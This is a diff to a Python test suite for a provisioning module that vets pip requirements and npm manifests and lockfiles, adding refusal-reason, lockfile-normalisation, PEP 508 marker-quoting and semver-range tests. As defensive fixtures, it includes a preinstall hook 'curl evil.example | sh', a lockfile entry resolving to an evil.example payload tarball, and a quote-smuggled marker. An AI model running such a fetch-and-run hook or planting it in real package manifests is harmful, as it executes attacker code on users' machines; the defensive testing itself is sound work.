@@ -11,6 +11,7 @@ import json
 import pathlib
 
 import pytest
+from packaging.markers import Marker
 
 from tinyassets import workspace_provision as wp
 from tinyassets.workspace_provision import (
@@ -21,6 +22,10 @@ from tinyassets.workspace_provision import (
 )
 
 HASH_A = "sha256:" + "a" * 64
+#: Written as codepoints so no escaping question arises about the test's own
+#: source; these are what a PEP 508 literal may be quoted with.
+Q = chr(34)
+SQ = chr(39)
 HASH_B = "sha256:" + "b" * 64
 SRI_512 = "sha512-" + "A" * 86 + "=="
 SRI_512_OTHER = "sha512-" + "B" * 86 + "=="
@@ -883,10 +888,97 @@ def test_node_refusal_reasons_are_all_in_the_closed_set() -> None:
     assert reasons <= wp.REFUSAL_REASONS
 
 
-def test_every_declared_reason_is_reachable_or_documented() -> None:
+# One input per reason that actually raises it. The predecessor grepped the
+# module source for the reason string, which a comment satisfies just as well as
+# a `_refuse` call -- it could not have failed for the reason it existed for.
+REASON_CASES: list[tuple[str, object]] = [
+    ("option_line", lambda: admit_requirements("--index-url https://pypi.org/simple")),
+    ("include", lambda: admit_requirements("-r other.txt")),
+    ("direct_url", lambda: admit_requirements("pkg @ https://example.com/pkg.whl")),
+    ("local_path", lambda: admit_requirements("./local/pkg")),
+    ("vcs", lambda: admit_requirements("git+https://example.com/a")),
+    ("unpinned", lambda: admit_requirements(f"pkg>=1.0 --hash={HASH_A}")),
+    ("missing_hash", lambda: admit_requirements("pkg==1.0")),
+    (
+        "bad_marker",
+        lambda: admit_requirements(f'pkg==1.0 ; extra == "dev" --hash={HASH_A}'),
+    ),
+    ("bad_name", lambda: admit_requirements(f"_pkg==1.0 --hash={HASH_A}")),
+    ("env_reference", lambda: admit_requirements("${PACKAGE_PIN}")),
+    ("too_large", lambda: admit_requirements("pkg==1.0", max_bytes=2)),
+    ("not_utf8", lambda: admit_manifest_bytes(b"\xff", max_bytes=64)),
+    ("missing_lockfile", lambda: admit_node(_manifest(), None)),
+    ("lockfile_version", lambda: admit_node(_manifest(), _lockfile(version=1))),
+    ("bad_json", lambda: admit_node("{", _lockfile())),
+    (
+        "non_registry_resolution",
+        lambda: admit_node(
+            _manifest(),
+            _lockfile(
+                {
+                    "node_modules/left-pad": _entry(
+                        resolved="https://registry.example.com/left-pad/-/x-1.3.0.tgz"
+                    )
+                }
+            ),
+        ),
+    ),
+    (
+        "git_dependency",
+        lambda: admit_node(
+            _manifest(dependencies={"left-pad": "github:a/left-pad"}), _lockfile()
+        ),
+    ),
+    (
+        "file_dependency",
+        lambda: admit_node(
+            _manifest(dependencies={"left-pad": "file:../left-pad"}), _lockfile()
+        ),
+    ),
+    (
+        "url_dependency",
+        lambda: admit_node(
+            _manifest(dependencies={"left-pad": "https://example.com/x.tgz"}),
+            _lockfile(),
+        ),
+    ),
+    (
+        "workspace_dependency",
+        lambda: admit_node(_manifest(workspaces=["packages/*"]), _lockfile()),
+    ),
+    (
+        "bundled_dependency",
+        lambda: admit_node(_manifest(bundleDependencies=["left-pad"]), _lockfile()),
+    ),
+]
+
+#: Raised by the manifest READER (the lease dirfd), never by this module; it is
+#: in the vocabulary so the sink has one home for every refusal reason.
+READER_ONLY_REASONS = {"not_regular_file"}
+
+
+@pytest.mark.parametrize(
+    ("reason", "case"),
+    [pytest.param(reason, case, id=reason) for reason, case in REASON_CASES],
+)
+def test_each_reason_has_an_input_that_raises_it(reason: str, case) -> None:
+    with pytest.raises(ProvisionRefused) as caught:
+        case()
+    assert caught.value.reason == reason
+
+
+def test_the_reason_table_covers_every_reason_this_module_raises() -> None:
+    covered = {reason for reason, _case in REASON_CASES}
+    assert covered == wp.REFUSAL_REASONS - READER_ONLY_REASONS
+    assert len(covered) == len(REASON_CASES), "a reason is listed twice"
+
+
+def test_the_reader_only_reason_is_never_raised_here() -> None:
+    """It is vocabulary, not behaviour: no `_refuse` in this module names it."""
     source = pathlib.Path(wp.__file__).read_text(encoding="utf-8")
-    for reason in wp.REFUSAL_REASONS:
-        assert f'"{reason}"' in source, reason
+    for reason in READER_ONLY_REASONS:
+        assert f'_refuse("{reason}"' not in source
+        assert f'ProvisionRefused("{reason}"' not in source
 
 
 # ----------------------------------------------------------------------------------
@@ -920,3 +1012,131 @@ def test_the_only_urllib_the_module_names_is_the_parser() -> None:
     for index in range(len(source)):
         if source.startswith("urllib", index):
             assert source.startswith("urllib.parse", index), source[index : index + 40]
+
+
+# ----------------------------------------------------------------------------------
+# Codex review findings
+# ----------------------------------------------------------------------------------
+
+
+def test_a_v2_legacy_dependency_tree_cannot_smuggle_a_url() -> None:
+    """A v2 lockfile carries a second, v1-shaped graph; admission must not forward it.
+
+    Validating the `packages` map and then handing the ORIGINAL text to the
+    resolver leaves whatever the legacy tree said in the file npm reads. The
+    normalized lockfile is therefore rebuilt from validated fields only.
+    """
+    lockfile = json.loads(_lockfile(version=2))
+    lockfile["dependencies"] = {
+        "left-pad": {
+            "version": "1.3.0",
+            "resolved": "https://evil.example/payload.tgz",
+            "integrity": SRI_512,
+        }
+    }
+    plan = admit_node(_manifest(), json.dumps(lockfile))
+    staged = json.loads(plan.normalized_lockfile)
+    assert "evil.example" not in plan.normalized_lockfile
+    assert "dependencies" not in staged
+    assert staged["lockfileVersion"] == 3
+
+
+def test_the_normalized_lockfile_carries_only_validated_fields() -> None:
+    lockfile = json.loads(_lockfile())
+    lockfile["packages"]["node_modules/left-pad"]["surprise"] = {"a": 1}
+    lockfile["surprise"] = "top level"
+    plan = admit_node(_manifest(), json.dumps(lockfile))
+    staged = json.loads(plan.normalized_lockfile)
+    assert "surprise" not in staged
+    assert "surprise" not in staged["packages"]["node_modules/left-pad"]
+
+
+def test_the_normalized_package_json_carries_only_validated_fields() -> None:
+    manifest = json.loads(_manifest())
+    manifest["scripts"] = {"preinstall": "curl evil.example | sh"}
+    manifest["surprise"] = "top level"
+    plan = admit_node(json.dumps(manifest), _lockfile())
+    staged = json.loads(plan.normalized_package_json)
+    assert "surprise" not in staged
+    assert "evil.example" not in plan.normalized_package_json
+
+
+def test_a_literal_holding_a_quote_keeps_its_boundaries() -> None:
+    """``str(Marker)`` re-quotes with double quotes, so canonicalising from it
+    turns one comparison into two. The canonical form must come from a parse of
+    the ORIGINAL text, with literals quoted so they survive a reparse.
+    """
+    literal = "linux" + Q + " or python_version == " + Q + "3.11"
+    marker = "sys_platform == " + SQ + literal + SQ
+    plan = admit_requirements(f"pkg==1.0 ; {marker} --hash={HASH_A}")
+    canonical = plan.records[0].marker
+    assert canonical is not None
+    reparsed = Marker(canonical)._markers
+    assert len(reparsed) == 1, reparsed
+    assert reparsed[0][2].value == literal
+
+
+def test_a_marker_holding_both_quote_kinds_refuses() -> None:
+    """A PEP 508 literal never holds its own delimiter, so "both kinds" is not a
+    literal at all -- it is a lexical error, and that is where it is refused.
+    """
+    literal = "a" + Q + "b" + SQ + "c"
+    with pytest.raises(ProvisionRefused) as caught:
+        admit_requirements(f'pkg==1.0 ; sys_platform == "{literal}" --hash={HASH_A}')
+    assert caught.value.reason == "bad_marker"
+
+
+def test_the_round_trip_postcondition_refuses_a_lossy_serialisation(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Make the serialiser lossy on purpose; admission must refuse, not ship it.
+
+    Without this the postcondition is untestable by construction: a correct
+    serialiser never trips it, so removing the check breaks nothing and the
+    safety net is decoration.
+    """
+    monkeypatch.setattr(wp, "_quote_literal", lambda value: Q + value + Q)
+    literal = "linux" + Q + " or python_version == " + Q + "3.11"
+    marker = "sys_platform == " + SQ + literal + SQ
+    with pytest.raises(ProvisionRefused) as caught:
+        admit_requirements(f"pkg==1.0 ; {marker} --hash={HASH_A}")
+    assert caught.value.reason == "bad_marker"
+
+
+NODE_BAD_RANGES = [
+    ("dist_tag_latest", "latest"),
+    ("dist_tag_next", "next"),
+    ("bare_word", "not-a-range"),
+    ("too_many_parts", "1.2.3.4"),
+    ("caret_too_many_parts", "^1.0.0.0"),
+    ("bare_comparator", ">="),
+    ("double_tilde", "~~1.0"),
+    ("empty_union", "||"),
+    ("dangling_hyphen", "1.0.0 - "),
+    ("leading_zero", "01.2.3"),
+    ("letters", "one.two.three"),
+]
+
+
+@pytest.mark.parametrize(
+    "spec", [pytest.param(spec, id=name) for name, spec in NODE_BAD_RANGES]
+)
+def test_dist_tags_and_malformed_ranges_refuse(spec: str) -> None:
+    manifest = _manifest(dependencies={"left-pad": spec})
+    error = _refusal(manifest, _lockfile())
+    assert error.reason == "non_registry_resolution"
+    assert "semver range" in error.detail
+
+
+NODE_GOOD_RANGES = [
+    "^1.3.0", "~2.1", "1.2.3", "=1.2.3", ">=1.0.0", "<2.0.0", ">1.0.0-rc.1",
+    ">=1.0.0 <2.0.0", "1.0.0 - 2.0.0", "1.x", "1.2.x", "*", "x", "~>1.2",
+    "^1.0.0 || ~2.0.0", "1.0.0-beta.1", "1.0.0+build.5", ">=1.2.7 <1.3.0",
+]
+
+
+@pytest.mark.parametrize("spec", NODE_GOOD_RANGES)
+def test_real_semver_ranges_are_admitted(spec: str) -> None:
+    manifest = _manifest(dependencies={"left-pad": spec})
+    plan = admit_node(manifest, _lockfile())
+    assert len(plan.packages) == 1
